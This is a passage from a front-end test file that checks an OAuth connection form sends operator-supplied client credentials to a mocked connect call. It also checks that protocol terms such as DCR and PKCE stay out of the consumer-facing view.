      buttonByText("Check link")?.dispatchEvent(new MouseEvent("click", { bubbles: true }));
    });
    await flushReact();

    const [, input] = connectAppMock.mock.calls[0];
    expect(input).toMatchObject({
      authMode: "oauth",
      oauthClient: { clientId: "operator-client", clientSecret: "operator-secret" },
    });
  });

  it("keeps protocol jargon off the consumer path", async () => {
    await render();
    await gotoLinkFrame(container, "https://mcp.example.test/mcp");
    await openAdvanced();

    for (const jargon of ["DCR", "Dynamic Client Registration", "CIMD", "Client ID Metadata", "RFC", "PKCE"]) {
      expect(container.textContent, jargon).not.toContain(jargon);
    }
  });
});
